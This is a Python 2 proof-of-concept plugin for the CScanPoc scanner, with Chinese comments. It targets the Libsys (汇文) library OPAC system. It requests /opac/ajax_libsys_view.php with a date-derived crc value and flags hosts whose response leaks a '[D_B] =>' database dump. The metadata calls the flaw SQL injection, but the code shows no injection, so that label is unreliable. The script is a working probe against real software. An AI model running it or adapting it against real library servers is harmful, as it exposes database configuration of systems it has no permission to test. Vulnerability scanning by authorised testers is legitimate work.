# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import datetime

class Vuln(ABVuln):
    vuln_id = 'Libsys_0004' # 平台漏洞编号，留空
    name = '汇文软件 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        汇文软件（Libsys）SQL注入漏洞。
        /opac/ajax_libsys_view.php
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '汇文软件'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '4b08996a-2f09-4e97-998e-6f09975a1c7c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            crc = datetime.datetime.strftime(datetime.date.today(),'%m%d')
            payload = "/opac/ajax_libsys_view.php?code=huiwen_opac&crc=" + crc[::-1]

            url = self.target + payload
            code, head,res, errcode, _ = hh.http(url)

            if code == 200 and '[D_B] =>' in res and '<p>' not in res:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
